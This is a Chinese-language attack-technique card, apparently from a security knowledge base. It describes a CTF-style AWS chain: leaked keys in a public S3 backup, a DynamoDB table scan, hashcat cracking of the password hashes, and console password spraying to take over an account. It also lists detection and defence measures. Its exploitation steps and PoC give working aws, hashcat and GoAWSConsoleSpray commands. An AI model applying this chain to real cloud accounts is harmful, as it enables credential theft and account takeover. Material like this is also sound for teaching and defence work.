---
id: cloud-cloud-iam-s3-backup-ak-dynamodb-scan-console-password-spray
title: 公开 S3 备份泄漏 AK → DynamoDB scan 拖用户表 → hashcat 破解 → AWS 控制台口令喷洒接管账号
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: aws-s3-ak-dynamodb-scan-console-spray
aliases:
- DynamoDB scan 用户表
- AWS 控制台喷洒
- GoAWSConsoleSpray
- SHA-256 密码哈希破解
- migration-backup.json 泄露 AK
- MFA false 喷洒
tags:
- cloud
- aws
- s3
- dynamodb
- credential
- hashcat
- password-spray
- console
- account-takeover
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V660
  verified_at: '2026-11-13T06:49:06+08:00'
  notes: 已对照12456原文挑战9与图03核对：匿名下载 asana-cloud-migration-backup.json 并提取 notes 中 AK、dynamodb list-tables/scan analytics_app_users、python 拼 user:hash、hashcat -m 1400、GoAWSConsoleSpray 命中 rstead Abc123!! MFA false、控制台读 user_order_logs（图03）全部一致；原文 describe-table user_order_logs 为 AccessDenied 亦与卡片‘原本无权限的表’表述相符。与dynamodb无鉴权scan(明文口令→SSH)非同链。PoC 未复跑。
---

## 一句话结论

公开可读的 S3 桶里若有迁移备份 JSON，里面常残留 `accessKeyID`/`secretAccessKey`；用该低权 AK 执行 `dynamodb list-tables`/`scan` 导出用户表，得到 `用户名:SHA-256(口令)`，hashcat `-m 1400` 配合 rockyou 破解后，用账号 ID + 用户名字典 + 口令字典对 AWS 控制台做低速口令喷洒，命中未启用 MFA 的账号即可登录控制台并读取 DynamoDB 敏感表。

## 原理

- 备份/迁移文件（Asana 导出、数据库导出、应用配置备份）经常把访问密钥、口令哈希等敏感数据以明文打包；若 S3 桶策略允许匿名 `GetObject`，攻击者无需任何凭据即可下载。
- DynamoDB 的 `Scan` 会返回表中全部 item；只要 AK 具备 `dynamodb:ListTables`/`Scan`，攻击者就能把 `analytics_app_users` 这类表整表导出。表中若存无盐/弱盐的 SHA-256 口令哈希，可直接用 hashcat 模式 1400 离线爆破。
- AWS 控制台登录需要账号 ID（可从 `sts get-caller-identity` 获得）、IAM 用户名和口令；`GoAWSConsoleSpray` 这类工具按“一个口令试多个用户”的低频方式喷洒，并返回 `MFA: false/true`，帮助挑选无 MFA 的账号。
- 为什么危害完整：拿到控制台会话后可访问该账号下的 DynamoDB/其它服务；本例在 `user_order_logs` 中直接读出 flag，说明低权 API 凭据 → 用户口令 → 控制台权限的链可以突破原凭据的权限边界。
- 控制台喷洒与 SSH/AD 喷洒的区别在于登录端点固定（`signin.aws.amazon.com`）、需要正确的 12 位账号 ID，并且要关注 MFA 与密码策略；低频、按用户轮换口令可降低触发风控的概率。

## 触发条件

- S3 桶匿名可读（或已获得可读凭据），且存在含 AK/SK 的备份/导出文件。
- 该 AK 具备 `dynamodb:ListTables` 与 `Scan`（或等价读权限），且表内存储可破解的口令哈希。
- 目标 IAM 用户使用弱口令，且未强制 MFA。
- 攻击者知道或能推出 AWS 账号 ID（`sts get-caller-identity` 直接返回）。

## 利用步骤

1. 匿名下载桶内备份：`aws s3 cp s3://<bucket>/migration/asana-cloud-migration-backup.json . --no-sign-request`，在 JSON 中搜索 `AKIA` 与 `secret`。
2. 配置 AK/SK，确认身份：`aws sts get-caller-identity`，记录 Account。
3. 枚举并导出表：`aws dynamodb list-tables`、`aws dynamodb scan --table-name analytics_app_users > output.json`。
4. 用脚本拼出 `user:hash` 列表：`jq` 或 Python 提取 `UserID.S` 与 `PasswordHash.S`。
5. 离线破解：`hashcat -m 1400 hash.txt rockyou.txt --username --force`，`hashcat --show -m 1400 hash.txt --username` 得到明文。
6. 生成 `user.txt`/`pass.txt`，对控制台低频喷洒：`./GoAWSConsoleSpray -a <account-id> -u user.txt -p pass.txt`，观察 `SUCCESS ... MFA: false`。
7. 用命中账号登录 AWS 控制台，访问 DynamoDB 中原本无权限的表（如 `user_order_logs`）读取敏感数据/flag。

## PoC

```bash
aws s3 cp s3://<bucket>/migration/asana-cloud-migration-backup.json . --no-sign-request
# 在 JSON 中提取 AK/SK 后：
aws configure
aws sts get-caller-identity
aws dynamodb list-tables
aws dynamodb scan --table-name analytics_app_users > output.json

# 提取 user:hash 后
hashcat -m 1400 hash.txt rockyou.txt --force --username
hashcat --show -m 1400 hash.txt --username

./GoAWSConsoleSpray -a <account-id> -u user.txt -p pass.txt
# [SUCCESS] user: <user>  Valid Password: <pass>  MFA: false
```

## 变体与关联

- 变体：表内口令为无盐 MD5/SHA-1 时换用对应 hashcat 模式；有盐哈希需先确认算法与盐位置。
- 变体：没有 DynamoDB 读权限时，备份 JSON 本身可能就含用户表；没有控制台口令时，可尝试 AK 可做的 IAM 提权原语。
- 变体：同样的“公开备份 → 云凭据 → 数据”链条适用于 S3 导出 XML、CI 日志、前端 JS 中的 AK。
- 关联：[[cloud-cloud-iam-s3-anonymous-enum-export-xml-privilege-escalation]]（S3 匿名枚举 + export.xml 凭据换权）、[[cloud-dynamodb-unauth-scan-credential-ssh-lateral]]（DynamoDB 无鉴权 scan 的明文口令变体）、[[cloud-cloud-iam-aws-access-key-leak-search-engine-takeover]]（泄露 AK 的通用接管）、[[pentest-initial-access-password-semantic-mutation-reuse]]（口令变体/复用思路）。
- 边界：桶策略拒绝匿名读、AK 无 DynamoDB 权限、口令哈希强盐且字典未命中、IAM 用户全部强制 MFA、控制台登录触发风控/锁定，链路即中断。

## 检测与防御

- 检测：CloudTrail 中异常的 `ListTables`/`Scan`（尤其来自新 IP/User-Agent）、控制台大量失败登录与随后的成功登录；GuardDuty 的 `CredentialAccess`/`Discovery` 告警；S3 匿名 GetObject 审计。
- 防御：S3 桶禁止匿名读，备份文件加密并最小化保存密钥/口令哈希；DynamoDB 最小权限、避免明文/弱哈希存口令；IAM 用户强制 MFA 与强口令策略；对控制台登录做失败锁定与异常地理告警；轮换泄露 AK。
